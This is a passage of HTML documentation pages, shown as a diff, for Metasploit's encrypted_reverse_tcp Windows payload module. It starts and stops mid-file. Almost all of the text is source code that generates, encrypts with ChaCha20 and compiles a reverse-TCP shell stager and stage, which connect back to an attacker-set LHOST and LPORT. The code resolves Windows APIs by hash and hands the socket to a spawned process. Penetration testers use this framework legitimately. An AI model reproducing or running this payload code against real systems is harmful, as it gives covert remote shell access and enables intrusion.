+  <span class='id identifier rubyid_reg'>reg</span> <span class='op'>=</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch_to_s'>arch_to_s</span><span class='period'>.</span><span class='id identifier rubyid_eql?'>eql?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x86</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>edi</span><span class='tstring_end'>&#39;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>rdi</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_inst'>inst</span> <span class='op'>=</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch_to_s'>arch_to_s</span><span class='period'>.</span><span class='id identifier rubyid_eql?'>eql?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x86</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>movl</span><span class='tstring_end'>&#39;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>movq</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+   void ExecutePayload()
+   {
+     SOCKET conn_socket = INVALID_SOCKET;
+
+     asm(&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_inst'>inst</span><span class='embexpr_end'>}</span><span class='tstring_content'> %%</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_reg'>reg</span><span class='embexpr_end'>}</span><span class='tstring_content'>, %0&quot;
+         :
+         :&quot;m&quot;(conn_socket)
+     );
+
+     HANDLE *comm_handles = init_process(conn_socket);
+     communicate(*(comm_handles), *(comm_handles+1), conn_socket);
+   }
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="exit_proc-instance_method">
+  
+    #<strong>exit_proc</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 252</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_exit_proc'>exit_proc</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    UINT ExitProc()
+    {
+      DWORD term_status;
+      FuncGetCurrentProcess GetCurrentProcess = (FuncGetCurrentProcess) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>GetCurrentProcess</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;GetCurrentProcess&#39;) -&gt; 0x51e2f352
+      FuncGetExitCodeProcess GetExitCodeProcess = (FuncGetExitCodeProcess) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>GetExitCodeProcess</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;GetExitCodeProcess&#39; -&gt; 0xee54785f
+
+      HANDLE curr_proc_handle = GetCurrentProcess();
+      GetExitCodeProcess(curr_proc_handle, &amp;term_status);
+
+      return term_status;
+    }
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="format_ds_opt-instance_method">
+  
+    #<strong>format_ds_opt</strong>(opt)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Options such as the LHOST and PORT need to become a null-terminated array to ensure they exist in the .text section.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+193
+194
+195
+196
+197
+198
+199</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 193</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_format_ds_opt'>format_ds_opt</span><span class='lparen'>(</span><span class='id identifier rubyid_opt'>opt</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_modified'>modified</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='id identifier rubyid_opt'>opt</span> <span class='op'>=</span> <span class='id identifier rubyid_opt'>opt</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span>
+  <span class='id identifier rubyid_opt'>opt</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_elem'>elem</span><span class='op'>|</span> <span class='id identifier rubyid_modified'>modified</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_elem'>elem</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&#39;, </span><span class='tstring_end'>&quot;</span></span> <span class='rbrace'>}</span>
+  <span class='id identifier rubyid_modified'>modified</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_modified'>modified</span><span class='embexpr_end'>}</span><span class='tstring_content'>0</span><span class='tstring_end'>&quot;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate-instance_method">
+  
+    #<strong>generate</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 25</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span> <span class='op'>||=</span> <span class='id identifier rubyid_generate_payload_uuid'>generate_payload_uuid</span><span class='period'>.</span><span class='id identifier rubyid_puid_hex'>puid_hex</span>
+  <span class='id identifier rubyid_iv'>iv</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ChachaNonce</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+
+  <span class='id identifier rubyid_conf'>conf</span> <span class='op'>=</span>
+  <span class='lbrace'>{</span>
+    <span class='label'>call_wsastartup:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CallWSAStartup</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>port:</span>            <span class='id identifier rubyid_format_ds_opt'>format_ds_opt</span><span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
+    <span class='label'>host:</span>            <span class='id identifier rubyid_format_ds_opt'>format_ds_opt</span><span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
+    <span class='label'>key:</span>             <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ChachaKey</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>nonce:</span>           <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ChachaNonce</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>iv:</span>              <span class='id identifier rubyid_iv'>iv</span><span class='comma'>,</span>
+    <span class='label'>uuid:</span>            <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>staged:</span>          <span class='id identifier rubyid_staged?'>staged?</span>
+  <span class='rbrace'>}</span>
+
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_staged?'>staged?</span>
+    <span class='id identifier rubyid_src'>src</span> <span class='op'>=</span> <span class='id identifier rubyid_generate_stager'>generate_stager</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='rparen'>)</span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_src'>src</span> <span class='op'>=</span> <span class='id identifier rubyid_generate_c_src'>generate_c_src</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_link_script'>link_script</span> <span class='op'>=</span> <span class='id identifier rubyid_module_info'>module_info</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>DefaultOptions</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LinkerScript</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_compile_opts'>compile_opts</span> <span class='op'>=</span>
+  <span class='lbrace'>{</span>
+    <span class='label'>strip_symbols:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>StripSymbols</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>linker_script:</span> <span class='id identifier rubyid_link_script'>link_script</span><span class='comma'>,</span>
+    <span class='label'>opt_lvl:</span>       <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>OptLevel</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>keep_src:</span>      <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>KeepSrc</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>keep_exe:</span>      <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>KeepExe</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>f_name:</span>        <span class='const'>Tempfile</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='id identifier rubyid_staged?'>staged?</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>reverse_pic_stager</span><span class='tstring_end'>&#39;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>reverse_pic_stageless</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_path'>path</span><span class='comma'>,</span>
+    <span class='label'>arch:</span>          <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch_to_s'>arch_to_s</span>
+  <span class='rbrace'>}</span>
+
+  <span class='id identifier rubyid_comp_code'>comp_code</span> <span class='op'>=</span> <span class='id identifier rubyid_get_compiled_shellcode'>get_compiled_shellcode</span><span class='lparen'>(</span><span class='id identifier rubyid_src'>src</span><span class='comma'>,</span> <span class='id identifier rubyid_compile_opts'>compile_opts</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_chacha_conf'>chacha_conf</span> <span class='op'>=</span>
+  <span class='lbrace'>{</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>uuid</span><span class='tstring_end'>&#39;</span></span>  <span class='op'>=&gt;</span>  <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>key</span><span class='tstring_end'>&#39;</span></span>   <span class='op'>=&gt;</span>  <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:key</span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>nonce</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span>  <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:nonce</span><span class='rbracket'>]</span>
+  <span class='rbrace'>}</span>
+  <span class='id identifier rubyid_save_conf_to_db'>save_conf_to_db</span><span class='lparen'>(</span><span class='id identifier rubyid_chacha_conf'>chacha_conf</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_comp_code'>comp_code</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_c_src-instance_method">
+  
+    #<strong>generate_c_src</strong>(conf)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 141</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_c_src'>generate_c_src</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>=</span> <span class='id identifier rubyid_initial_code'>initial_code</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:call_wsastartup</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_init_winsock'>init_winsock</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_comm_setup'>comm_setup</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_get_new_key'>get_new_key</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_init_proc'>init_proc</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_get_load_library'>get_load_library</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='comma'>,</span> <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_call_init_winsock'>call_init_winsock</span> <span class='kw'>if</span> <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:call_wsastartup</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_start_comm'>start_comm</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_single_comm'>single_comm</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_stage-instance_method">
+  
+    #<strong>generate_stage</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 107</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_stage'>generate_stage</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_conf'>conf</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:datastore</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_datastore'>datastore</span>
+  <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:staged</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='kw'>true</span>
+  <span class='id identifier rubyid_stage_uuid'>stage_uuid</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_uuid'>uuid</span>
+  <span class='id identifier rubyid_key'>key</span><span class='comma'>,</span> <span class='id identifier rubyid_nonce'>nonce</span> <span class='op'>=</span> <span class='id identifier rubyid_retrieve_chacha_creds'>retrieve_chacha_creds</span><span class='lparen'>(</span><span class='id identifier rubyid_stage_uuid'>stage_uuid</span><span class='rparen'>)</span>
+
+  <span class='kw'>unless</span> <span class='id identifier rubyid_key'>key</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_nonce'>nonce</span>
+    <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>No existing key/nonce in db. Resorting to datastore options.</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ChachaKey</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_nonce'>nonce</span> <span class='op'>=</span> <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ChachaNonce</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_iv'>iv</span> <span class='op'>=</span> <span class='id identifier rubyid_nonce'>nonce</span>
+
+  <span class='id identifier rubyid_link_script'>link_script</span> <span class='op'>=</span> <span class='id identifier rubyid_module_info'>module_info</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>DefaultOptions</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LinkerScript</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_comp_opts'>comp_opts</span> <span class='op'>=</span>
+  <span class='lbrace'>{</span>
+    <span class='label'>strip_symbols:</span> <span class='kw'>false</span><span class='comma'>,</span>
+    <span class='label'>linker_script:</span> <span class='id identifier rubyid_link_script'>link_script</span><span class='comma'>,</span>
+    <span class='label'>keep_src:</span>      <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>KeepSrc</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>keep_exe:</span>      <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>KeepExe</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>f_name:</span>        <span class='const'>Tempfile</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>reverse_pic_stage</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_path'>path</span><span class='comma'>,</span>
+    <span class='label'>arch:</span>          <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch_to_s'>arch_to_s</span>
+  <span class='rbrace'>}</span>
+
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>=</span> <span class='id identifier rubyid_initial_code'>initial_code</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_get_new_key'>get_new_key</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_init_proc'>init_proc</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_exec_payload_stage'>exec_payload_stage</span>
+  <span class='id identifier rubyid_shellcode'>shellcode</span> <span class='op'>=</span> <span class='id identifier rubyid_get_compiled_shellcode'>get_compiled_shellcode</span><span class='lparen'>(</span><span class='id identifier rubyid_src'>src</span><span class='comma'>,</span> <span class='id identifier rubyid_comp_opts'>comp_opts</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_stage_obj'>stage_obj</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Rex/Crypto.html" title="Rex::Crypto (module)">Crypto</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Rex/Crypto/Chacha20.html" title="Rex::Crypto::Chacha20 (class)">Chacha20</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../../Rex/Crypto/Chacha20.html#initialize-instance_method" title="Rex::Crypto::Chacha20#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='id identifier rubyid_key'>key</span><span class='comma'>,</span> <span class='id identifier rubyid_iv'>iv</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_stage_obj'>stage_obj</span><span class='period'>.</span><span class='id identifier rubyid_chacha20_crypt'>chacha20_crypt</span><span class='lparen'>(</span><span class='id identifier rubyid_shellcode'>shellcode</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_stager-instance_method">
+  
+    #<strong>generate_stager</strong>(conf)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 85</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_stager'>generate_stager</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>=</span> <span class='id identifier rubyid_initial_code'>initial_code</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:call_wsastartup</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_init_winsock'>init_winsock</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_comm_setup'>comm_setup</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_get_load_library'>get_load_library</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='comma'>,</span> <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_call_init_winsock'>call_init_winsock</span> <span class='kw'>if</span> <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:call_wsastartup</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_start_comm'>start_comm</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_stager_comm'>stager_comm</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_compiled_shellcode-instance_method">
+  
+    #<strong>get_compiled_shellcode</strong>(src, opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Raises:</p>
+<ul class="raise">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw/CompiledPayloadNotFoundError.html" title="Metasploit::Framework::Compiler::Mingw::CompiledPayloadNotFoundError (class)">Metasploit::Framework::Compiler::Mingw::CompiledPayloadNotFoundError</a></span></tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 161</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_compiled_shellcode'>get_compiled_shellcode</span><span class='lparen'>(</span><span class='id identifier rubyid_src'>src</span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_comp_obj'>comp_obj</span> <span class='op'>=</span> <span class='kw'>nil</span>
+  <span class='kw'>case</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:arch</span><span class='rbracket'>]</span>
